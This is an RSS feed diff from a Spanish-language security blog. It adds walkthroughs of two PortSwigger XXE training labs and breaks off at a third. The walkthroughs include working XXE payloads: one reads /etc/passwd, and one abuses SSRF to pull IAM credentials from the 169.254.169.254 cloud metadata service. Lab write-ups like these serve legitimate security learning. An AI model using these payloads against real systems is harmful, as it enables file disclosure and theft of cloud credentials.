@@ -6,7 +6,871 @@
         <description>Recent content on A1ux</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>es-GT</language>
-        <lastBuildDate>Sat, 22 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 23 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Portswigger Academy Learning Path: XML external entity (XXE) Lab 1</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/</link>
+        <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: XML external entity (XXE) Lab 1" /&gt;&lt;h1 id=&#34;lab-exploiting-xxe-using-external-entities-to-retrieve-files&#34;&gt;Lab: Exploiting XXE using external entities to retrieve files&lt;/h1&gt;
+&lt;p&gt;La vulnerabilidad o el ataque de XXE es poder realizar una inyeccion XML en la aplicacion que analiza la entrada que le pasa el usuario o el sistema. Lo que hace que un analizados XML no este configuracion o este configurado debilmente para que procese peticiones que un usuario mal intencionado pueda inyectar. Pudiendo llegar a ejecucion de comandos, lectura de archivos y otros.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/xxe-injection.svg&#34; &gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/xxe-injection.svg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;Proceso de XXE&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Proceso de XXE&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar una inyeccion XXE para pode recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; valiendose de la configuracion debil del analizador.&lt;/p&gt;
+&lt;p&gt;Primero notamos la opcion de &lt;code&gt;Check stock&lt;/code&gt; de la web en la que recuperamos la existencia de los productos.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 127; 
+			flex-basis: 304px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/checkstock.png&#34; data-size=&#34;1760x1385&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/checkstock.png&#34;
+			width=&#34;1760&#34;
+			height=&#34;1385&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Check stock&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Check stock&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Al ir a la opcion de &lt;code&gt;Check stock&lt;/code&gt; en burp vemos la peticion que se hace al servidor usando lenguaje XML para realizar la peticion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 210; 
+			flex-basis: 506px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/request1.png&#34; data-size=&#34;1177x558&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/request1.png&#34;
+			width=&#34;1177&#34;
+			height=&#34;558&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/request1_hu502aaabc7459d44155150163c4a2dd31_71185_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/request1_hu502aaabc7459d44155150163c4a2dd31_71185_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion para recuperar el stock del producto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion para recuperar el stock del producto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
+&lt;p&gt;Sabiendo la peticion que se hace lo primero que haremos sera recuperar el archivo de &lt;code&gt;/etc/passwd&lt;/code&gt; esto a traves de declarar la DTD para luego referenciar la entidad a nuestro archivo que queremos leer. Que es con la siguiente sintaxis. Luego se referencia en cualquiera del valor que se imprimira o recibira de la web que sera &lt;code&gt;productId&lt;/code&gt; referenciando con &lt;code&gt;&amp;amp;xxe;&lt;/code&gt;. Si no realizamos este proceso no podremos recuperar los datos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;&lt;span class=&#34;ni&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 220; 
+			flex-basis: 528px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/request2.png&#34; data-size=&#34;1459x663&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/request2.png&#34;
+			width=&#34;1459&#34;
+			height=&#34;663&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/request2_hu73bd00807c4ccd55107aa2c34190d3e9_134216_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/request2_hu73bd00807c4ccd55107aa2c34190d3e9_134216_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Recuperando el archivo /etc/passwd&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Recuperando el archivo /etc/passwd&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto hemos resuelto el lab.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 227; 
+			flex-basis: 545px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/resuelto.png&#34; data-size=&#34;1794x790&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/resuelto.png&#34;
+			width=&#34;1794&#34;
+			height=&#34;790&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/resuelto_hu0e212aafeb318f19ed7298630a6f382c_372762_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-1/resuelto_hu0e212aafeb318f19ed7298630a6f382c_372762_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: XML external entity (XXE) Lab 2</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/</link>
+        <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/head.png" alt="Featured image of post Portswigger Academy Learning Path: XML external entity (XXE) Lab 2" /&gt;&lt;h1 id=&#34;lab-exploiting-xxe-to-perform-ssrf-attacks&#34;&gt;Lab: Exploiting XXE to perform SSRF attacks&lt;/h1&gt;
+&lt;p&gt;La vulnerabilidad o el ataque de XXE es poder realizar una inyeccion XML en la aplicacion que analiza la entrada que le pasa el usuario o el sistema. Lo que hace que un analizados XML no este configuracion o este configurado debilmente para que procese peticiones que un usuario mal intencionado pueda inyectar. Pudiendo llegar a ejecucion de comandos, lectura de archivos y otros.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/xxe-injection.svg&#34; &gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/xxe-injection.svg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;Proceso de XXE&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Proceso de XXE&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar un ataque de SSRF valiendose de la inyeccion XXE valiendose de la configuracion debil del analizador.&lt;/p&gt;
+&lt;p&gt;Primero notamos la opcion de &lt;code&gt;Check stock&lt;/code&gt; de la web en la que recuperamos la existencia de los productos.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 127; 
+			flex-basis: 304px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/checkstock.png&#34; data-size=&#34;1760x1385&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/checkstock.png&#34;
+			width=&#34;1760&#34;
+			height=&#34;1385&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Check stock&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Check stock&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Al ir a la opcion de &lt;code&gt;Check stock&lt;/code&gt; en burp vemos la peticion que se hace al servidor usando lenguaje XML para realizar la peticion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 210; 
+			flex-basis: 505px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request1.png&#34; data-size=&#34;1167x554&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request1.png&#34;
+			width=&#34;1167&#34;
+			height=&#34;554&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request1_hu152d042840d41d1570f907f338ae26b2_70610_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request1_hu152d042840d41d1570f907f338ae26b2_70610_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion para recuperar el stock del producto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion para recuperar el stock del producto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
+&lt;p&gt;Sabiendo la peticion que se hace lo primero que haremos sera recuperar el archivo que contiene la key del EC2 esto a traves de declarar la DTD para luego referenciar la entidad a nuestro archivo que queremos leer. Que es con la siguiente sintaxis. Luego se referencia en cualquiera del valor que se imprimira o recibira de la web que sera &lt;code&gt;productId&lt;/code&gt; referenciando con &lt;code&gt;&amp;amp;xxe;&lt;/code&gt;. Si no realizamos este proceso no podremos recuperar los datos. ESta se encuentra en la ip &lt;code&gt;http://169.254.169.254/&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/path/to/key&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora enviamos la peticion y como podemos notar cada una de las peticiones nos ira dando las rutas para el siguiente path y asi recuperar la key.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 206; 
+			flex-basis: 495px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request2.png&#34; data-size=&#34;1194x578&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request2.png&#34;
+			width=&#34;1194&#34;
+			height=&#34;578&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request2_huf0bfcc3e5fb88ed3d3797a53bd7b79f2_77936_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request2_huf0bfcc3e5fb88ed3d3797a53bd7b79f2_77936_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion 1 para solicitar la key a un equipo interno&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion 1 para solicitar la key a un equipo interno&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 218; 
+			flex-basis: 524px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request3.png&#34; data-size=&#34;1242x568&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request3.png&#34;
+			width=&#34;1242&#34;
+			height=&#34;568&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request3_hu489397df186f8630c7b67300bd40178d_78822_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request3_hu489397df186f8630c7b67300bd40178d_78822_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion 2 para solicitar la key a un equipo interno&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion 2 para solicitar la key a un equipo interno&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 204; 
+			flex-basis: 490px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request4.png&#34; data-size=&#34;1210x592&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request4.png&#34;
+			width=&#34;1210&#34;
+			height=&#34;592&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request4_huf4a4769c24cc2682f602febeafc58925_78910_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request4_huf4a4769c24cc2682f602febeafc58925_78910_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion 3 para solicitar la key a un equipo interno&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion 3 para solicitar la key a un equipo interno&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 201; 
+			flex-basis: 483px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request5.png&#34; data-size=&#34;1191x591&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request5.png&#34;
+			width=&#34;1191&#34;
+			height=&#34;591&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request5_hu452db1e0886d411fe87a840a93621d65_79286_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request5_hu452db1e0886d411fe87a840a93621d65_79286_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion 4 para solicitar la key a un equipo interno&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion 4 para solicitar la key a un equipo interno&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 229; 
+			flex-basis: 549px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request6.png&#34; data-size=&#34;1216x531&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request6.png&#34;
+			width=&#34;1216&#34;
+			height=&#34;531&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request6_hufc51d4177a73dc2ea4c78350d0c42cde_77977_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request6_hufc51d4177a73dc2ea4c78350d0c42cde_77977_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion 5 para solicitar la key a un equipo interno&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion 5 para solicitar la key a un equipo interno&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Finalmente encontramos la ultima peticion en la cual se encuentra la key&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;&lt;span class=&#34;ni&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 291; 
+			flex-basis: 699px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request7.png&#34; data-size=&#34;1534x526&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request7.png&#34;
+			width=&#34;1534&#34;
+			height=&#34;526&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request7_hua9f73dbecc3975e7f78e9de01d82f499_111603_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/request7_hua9f73dbecc3975e7f78e9de01d82f499_111603_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion 6 para solicitar la key a un equipo interno&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion 6 para solicitar la key a un equipo interno&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto hemos resuelto el lab.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 214; 
+			flex-basis: 515px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/resuelto.png&#34; data-size=&#34;1779x828&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/resuelto.png&#34;
+			width=&#34;1779&#34;
+			height=&#34;828&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/resuelto_hu480e6ab60706cbea85f375ffa644a7d5_301614_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-2/resuelto_hu480e6ab60706cbea85f375ffa644a7d5_301614_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: XML external entity (XXE) Lab 3</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/</link>
